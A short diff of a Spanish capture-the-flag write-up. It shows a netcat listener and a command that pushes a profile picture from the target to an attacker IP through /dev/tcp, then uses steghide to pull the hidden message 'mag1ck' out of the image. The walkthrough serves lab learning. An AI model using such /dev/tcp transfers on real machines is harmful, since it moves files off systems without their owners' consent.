@@ -66,3 +66,6 @@ Para pasarlo, escucharemos en una terminal con ```nc -lvnp 435 > test.jpeg``` y 
 ```
 cat profile_picture.jpeg > /dev/tcp/172.17.0.1/435
 ```
+Ahora que tenemos el contenido de ```profile_picture.jpeg```, podemos ver si tiene algun mensaje oculto con ```steghide extract -sf test.jpeg``` y nos deja un archivo llamado secret.txt, el cual al abrirlo, vemos que tiene el mensaje 'mag1ck'.
+
+
